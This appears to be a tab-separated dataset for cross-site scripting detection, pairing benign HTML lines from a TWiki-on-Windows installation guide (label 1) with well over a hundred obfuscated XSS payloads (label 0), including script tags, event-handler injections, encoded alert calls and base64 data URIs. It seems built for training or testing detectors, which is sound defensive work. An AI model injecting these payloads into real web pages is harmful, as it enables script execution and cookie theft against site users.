 ' onerror=alert(1);'	0
<img src="http://TWiki.org/p/pub/TWiki/TWikiDocGraphics/new.gif" border="0" alt="NEW" width="28" height="8" />	1
<h3><a name="Alternatives"> Alternatives </a></h3>	1
<a href="http://twiki.org/cgi-bin/" title="'Codev.ActiveState' on TWiki site, we know it!">TWiki:Codev.ActiveState</a>	1
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindows" title="'Codev.TWikiOnWindows' on TWiki site, we know it!">TWiki:Codev.TWikiOnWindows</a>	1
<a href="http://twiki.org/cgi-bin/view/Codev.TWikiOnWindowsKnownConfigurations" title="'Codev.TWikiOnWindowsKnownConfigurations' on TWiki site, we know it!">Configurations</a>	1
<a href="http://twiki.org/cgi-bin/view/Support.TwikiOnWindowsBinaryAttachments" title="'Support.TwikiOnWindowsBinaryAttachments' on TWiki site, we know it!">TWiki:Support</a>.	1
<h2><a name="Checking_versions"> Checking versions </a></h2>	1
If you already have some of these add-ons installed, here's how to check the versions - this assumes you have	1
<i>: Cygwin DLL version is the number in 1.3.x format</i>	1
less c:/<i>your-apache-dir</i>/Announcement	1
If you have an older version of any component, do yourself a favour and <strong>upgrade it</strong> as part of the install process.	1
<h2><a name="Pre_requisites_and_upgrades"> Pre-requisites and upgrades </a></h2>	1
<h3><a name="Text_editing"> Text editing </a></h3>	1
<code>nano</code>, a non-GUI editor, but if you prefer to use a GUI editor, you should first install PFE, a freeware editor that supports Unix format files. PFE is available	1
Another good <a href="http://twiki.org/cgi-bin/view/Codev.OpenSource" title="'Codev.OpenSource' on TWiki site, we know it!">TWiki:Codev.OpenSource</a>	1
<h2><a name="The_Unix_Windows_Environment"> The Unix/Windows Environment </a></h2>	1
It's a little known fact that you can use pathnames such as <code><b>c:/apache</b></code> almost everywhere in Windows - try it in a File Open dialogue box.	1
The reason this matters is that <code><b>'\'</b></code> is a special character to Perl and other tools, so it's much easier to use <code><b>'/'</b></code> everywhere.	1
<h3><a name="The_Cygwin_environment"> The Cygwin environment </a></h3>	1
<a href="http://twiki.org/cgi-bin/view/Codev.CygWin" title="'Codev.CygWin' on TWiki site, we know it!">TWiki:Codev.CygWin</a> is a Unix-like environment for Windows	1
<h3><a name="The_Apache_environment"> The Apache environment </a></h3>	1
If you need to use spaces in file names (not recommended), put double quotes around the file name in the <code>httpd.conf</code>	1
<h3><a name="The_Perl_environment"> The Perl environment </a></h3>	1
<code>ls</code>, <code>egrep</code>, and RCS tools that it (typically) launches with the <code>bash</code> shell.	1
If you need to use spaces in file names (not recommended), you <em>may</em><code>TWiki.cfg</code>	1
<h2><a name="Installing_Components"> Installing Components </a></h2>	1
<h3><a name="TWiki_part_1_"> TWiki (part 1) </a></h3>	1
Head to <a href="http://twiki.org" target="_top">http://twiki.org</a>	1
<h3><a name="Apache"> Apache </a></h3>	1
<strong>1. Download Apache</strong>	1
<a href="http://httpd.apache.org/" target="_top">http://httpd.apache.org/</a>	1
<a href="http://www.apache.org/dist/httpd/Announcement.html" target="_top">this page</a>	1
<a href="http://www.apache.org/dyn/closer.cgi" target="_top">http://www.apache.org/dyn/closer.cgi</a>	1
The file to download is <code><b></b></code>	1
<strong><em>NOTE</em></strong><code><b>instmsi.exe</b></code><a href="http://httpd.apache.org/dist/httpd/binaries/win32/" target="_top"></a>	1
<strong><em>NOTE</em></strong>: The Apache package itself requires a download of around 2 MB, and up to 10 MB of free disk space once installed.	1
<strong>2. Install Apache</strong>	1
Specify <code><b>c:\</b></code> as the installation directory - this actually installs Apache into <code><b>c:\apache</b></code> (if you specify <code>c:\apache</code>	1
<a href="http://httpd.apache.org/docs/windows.html" target="_top">Installing Apache on Windows</a> and <a href="http://httpd.apache.org/docs/win_service.html" target="_top">Windows NT/2000 service</a>.	1
<strong>3. Test Apache</strong>	1
If necessary, start apache, either as a Win2000 service (using Admin Tools | Computer Management, or by typing <code>apache -k start -n apache</code>	1
Point your browser at <a href="http://yourdomain.com/" target="_top">http://yourdomain.com/</a> to see the Apache intro page.	1
<code>apache -k restart</code> for standalone Apache process running in another window	1
<code>apache -k restart -n apache</code> for Apache running as a Win2000 service (-n gives name of service)	1
Another useful command is <code>apache -k stop</code>.	1
<h3><a name="Cygwin_Unix_tools_Perl_and_RCS"> </a> Cygwin, Unix tools, Perl and RCS </h3>	1
<strong>4. Install Cygwin</strong>	1
Head to <a href="http://cygwin.com" target="_top">http://cygwin.com</a>, and click the <strong><em>Install Cygwin Now</em></strong> link.	1
Now run the Cygwin <code>setup.exe</code> file - this will also install Perl and RCS in one fell swoop.	1
On first page, accept the defaults (be sure that the <strong><em>default text file type is Unix</em></strong> to avoid problems with attachment uploads, and specify 'install for all users')	1
Select <code>c:\download\cygwin-dist</code> as the local package directory, and suitable proxy settings, then pick a local mirror site	1
In the package list screen, hit the <strong>View</strong> button until you get an alphabetical list that says <strong>Full</strong> to the right of the button.	1
Leave the radio button on <strong>Curr</strong> (Current)	1
For each package, make sure the <strong>New</strong> column in the installer has a version number under it. If it says 'Skip' or 'Keep'	1
<code>bash</code>	1
<code>wget</code> (optional, useful for Perl install and <a href="http://twiki.org/cgi-bin/view/Codev.ReadWriteOfflineWiki" title="'Codev.ReadWriteOfflineWiki' on TWiki site, we know it!">TWiki:Codev.ReadWriteOfflineWiki</a>)	1
<a href="http://cygwin.com/faq/faq.html#SEC32" target="_top">Cygwin FAQ entry</a> and upgrade <code>libncurses5</code>.	1
<strong><em>NOTE</em></strong>: The mandatory packages require a download of about 12 MB - about half of this is Perl, which would be necessary even without Cygwin, and most of the rest is gcc	1
<strong><em>NOTE</em></strong>: The installer keeps a local copy of downloaded files, so it's easy to re-install without re-downloading.	1
<strong>5. Test Cygwin</strong>	1
Launch the desktop icon - this runs the <code>bash</code> shell, which has command line editing features	1
TIP: When typing a directory or file name, hit the TAB key after the first few letters of the name - <code>bash</code> will 'complete' the name.	1
Type <code>rcs -V</code> - you should see the RCS version, 5.7	1
Type <code>perl -v</code> - you should see cygwin mentioned in the first line, and the Perl version, 5.6.1	1
Type <code>grep home /etc/passwd</code> - you should see some output.	1
The <a href="http://cygwin.com/cygwin-ug-net/cygwin-ug-net.html" target="_top">Cygwin User Guide</a> is well worth reading for some background on how Cygwin works.	1
<strong>6. Configure Cygwin for binary mode</strong>	1
<strong><em>This is very important - omitting this step leads to a partially working system that corrupts RCS files</em></strong>	1
<a href="http://twiki.org/cgi-bin/view/Codev.CookbookLineEndingProblems" title="'Codev.CookbookLineEndingProblems' on TWiki site, we know it!">TWiki:Codev.CookbookLineEndingProblems</a>	1
<b>mkdir /twiki /c c:/twiki</b>	1
This configures <code>/twiki</code> (known as a 'mount point') to map onto <code>c:/twiki</code> and for that directory tree to always be in binary mode, and does the same for <code>/c</code>	1
It is <strong>very important</strong> that all lines in the output of <code>mount</code> say 'binmode' under Flags	1
If the lines for <code>C:\cygwin</code> directories do not, you should uninstall and then re-install Cygwin to ensure that binary attachment uploads will work.	1
<a href="http://www.cygwin.com/cygwin-ug-net/using.html" target="_top">Cygwin documentation</a> for more details on this.	1
Type <code><b>cd /twiki</b></code>	1
Type <code><b>echo hi &gt;t</b></code>	1
Type <code><b>cat -v t</b></code> - you should see <code><b>hi</b></code> as the output	1
If you see filename errors, your <strong>mounts did not work</strong> for some reason - check your typing	1
If you see <code><b>hi^M</b></code> as output, <strong>your /twiki directory is not in binary mode</strong>	1
Clean up by doing <code>rm t</code>	1
This setup is written to the Windows registry, so there's no need to put these commands into a <code>.profile</code> file. For more information on binary vs text mode, see this	1
<a href="http://cygwin.com/cygwin-ug-net/using-textbinary.html" target="_top">User Guide section</a> and this <a href="http://cygwin.com/faq/faq.html#SEC54" target="_top">FAQ entry</a>.	1
<h3><a name="TWiki_part_2_"> TWiki (part 2) </a></h3>	1
/></track><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();	0
 onmouseover='alert("xss".toUpperCase())	0
!#%&)(*+,-./:;=?@]\[^_'}|{~""" style="background:url(javascript:alert(1))" "	0
!#%&)(*+,-./:;=?@]\[^_'}|{~"<s>"><script>alert(1)</script>	0
!#%&)(*+,-./:;=?@]\[^_'}|{~&#39;<s>&#39;><script>alert(1)</script>	0
!#%&)(*+,-./:;=?@]\[^_'}|{~<s><script>alert(1)</script>	0
!#%&)(*+,-./:;=?@]\&#39;&#39;style=&#39;background:url(javascript:alert(1))&#39; &#39;	0
" onmouseover="alert('\u0058\u0053\u0053')	0
" onmouseover="alert('&#0088;&#0083;&#0083;')	0
" onmouseover="alert(/&#0088;&#0083;&#0083;/.source)	0
"'><script>eval("alert(document\x2ecookie)")</script>	0
"/onmousemove="window['\u0061lert']('\u0058SS')	0
"/onmouseover="window['aler'+'t']('XS'+'S')">	0
"&#39;><img src="javascript:alert(1)>	0
"&#39;><script>alert(1)</script> onclick=alert(1)	0
"</table><video><source onerror=javascript:window.onerror=alert();onerror=\u0061lert();	0
"</table><video><source onerror=jAvaScrIpt:window.onerror=alert();onerror=\u0061lert();	0
"><script>eval('u0061u006cu0065u0072u0074u0028u0027u0058u0053u0053u0027u0029');</script>	0
"><script>eval("al"+"ert(1)");</script>	0
"><svg><script>alert&#40/1/.source&#41</script>	0
"onbeforepaste="&#000119indow['&#00097lert']('&#00088SS')" 	0
"onblur="&#x0077indow['&#x0061lert']('&#x0058SS')" 	0
"oncopy="&#0119indow['&#097lert']('&#088SS')" 	0
"ondblclick="&#00119indow['&#0097lert']('&#0088SS')"	0
"onKeyDown="document.write('<x73cript>x61lert(x22XSSx22)</x73cript>')"	0
"onKeyPress="/127641/['constructor']['constructor']('al'+'ert'+'('+'''+1+'''+')')()	0
"onKeyPress="u0077indow['u0061lert']('u0058SS')" 	0
"onmouseover="&#x077indow['&#x061lert']('&#x058SS')" 	0
"onmouseover="alert(decodeURI(decodeURI(/%58%53%53/.source)))"	0
"onpaste="&#119indow['&#97lert']('&#88SS')" 	0
"onSelectStart="/123441/['cons'+'truc'+'tor']['cons'+'truc'+'tor']('a'+'l'+'e'+'r'+'t'+'('+'''+'XS'+'S'+'''+')')()	0
"onSelectStart="&#x00077indow['&#x00061lert']('&#x00058SS')"	0
"st%00yle="behavior:\0075rl(bc)"onread%00ystatechange="ale%00rt(1)	0
\u0061lert();script:\u0061lert();<video><source onerror=javascript:window.onerror=alert``;java	0
&#39; style=&#39;background:url(javascript:alert(1))&#39; &#39;	0
&#39;<s>&#39;><img src="javascript:alert(1)&#39;>	0
&#39;<s>&#39;><script>alert(1)</script>	0
&#39;><s><img src="javascript:alert(1)>	0
&#x09;</track><video><source onerror=javascript:window.onerror=alert();\u0061lert``;	0
&#x09;rel=<video><source <thead onerror=\u0061lert();	0
#saivs.js <video><source onerror=javascript:window.onerror=alert();javascript:alert();	0
%83%A1%82%83%A1%9E%83%A1%9Cscript%20%83%A1%9E%20alert(1)//%20%83%A1%9C/script%20%83%A1%9E	0
%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E	0
` onmouseover=`alert(/xss/.source.toUpperCase())	0
</command>enctype=rows=<video><source onerror=alert();	0
</form>al\u0065rt``;<video><source onerror=javascript:window.onerror=alert();alert();	0
</frameset></track><video><source src=x onerror=javascript:window.onerror=alert();	0
</iframe> /></textarea><video><source onerror=alert();	0
<%u00df style="color:ex/***/pression(alert(1));"/>	0
<a href="test:),< s c r i p t > a l e r t ( document.domain ) < / s c r i p t >">click me</a>	0
<a href=data:html;base64,PHNjcmlwdD5hbGVydCgwKTs8L3NjcmlwdD4=>a</a>	0
<body onload=alert(1); />	0
<body onmouseover=alert(1); <canvas </basefont>	0
<div style="color:\0065xpression(alert('XSS2'));">b</div>	0
<div style="color:&#x65;xpression(alert(1));">a</div>	0
<div style="left:&#x0065;xpression(alert(1))">	0
<embed onload=alert();<script type="text/javascript">	0
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>	0
<embed/<a/onload=alert();?n<script type="text/javascript">	0
<embed/onload=al?u0065rt();?n<script type="text/javascript">	0
<embed/src=# onload=confirm();?n<script type="text/javascrip t">	0
<frameset><frame/onload=alert(1); />	0
<iframe onload=alert``; /><select	0
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="></iframe>	0
<iframe src=# <keygen onload=alert();?n<script></script>	0
<iframe/*/onload=charset=alert();>	0
<iframe/onload=alert();>size=<command	0
<iframe/onload=alert(1); />	0
<img src= <meter onerror=alert();?n<script></script>	0
<img src=# <keygen onerror=?u0061lert``;>	0
<img src=x alt=confirm(1) onmouseover=eval(alt)>	0
<keygen name="confirm(1)" onfocus="eval(this.name);" autofocus>	0
<object/data=evil.html #</a>	0
<object/onload="onfocus=alert();"<script type="text/javascri pt">	0
<object/src=# onload=alert();?n<script type="text/javascript ">	0
<object/src=x onload=alert(1);?n<script type="text/javascript">	0
<progress </caption><video><source <body onerror=alert();	0
<script src="data:text/html,al?u0065rt``;"<script></script>	0
<script src="http://example.com/xss.jpg"></script>	0
<script src=# <label onerror=confirm();?n<script></script>	0
<script/src="data:text/html,alert();"<script></script>	0
<script>al?u0065rt();</script></tr><th/	0
<script>al?u0065rt();</script></tr><th/	0
<script>onerror=?u0061lert(1);</script>	0
<style><img src='</style><img src=x onerror=alert(1)//'>	0
<svg/<canvas/<select/onload=confirm();>	0
<svg/<canvas/<select/onload=confirm(1);>	0
<svg/onload="?u0061lert();"></output>	0
<svg/onload=al?u0065rt();?n<script type="text/javascript">	0
<svg/onload=alert(1); </del>	0
<svg><style><img/src=x onerror=alert(1)// </b>	0
<video><source <tfoot <td onerror=javascript:window.onerror=alert();alert();	0
al?u0065rt();<script>confirm();</script>	0
colspan=<iframe <a onload=al?u0065rt();>	0
icon=<body <input/onload=confirm(1);>	0
icon=<iframe/<body onload=?u0061lert();>	0
icon=<iframe/<img onload=al?u0065rt();>	0
javascript:\u0061lert();</script><frameset><basefont/</td>	0
kind=<body <img onload=alert``;>	0
onerror=javascript:window.onerror=alert();</td><video><source onerror=javascript:window.onerror=alert();script:al\u0065rt();	0
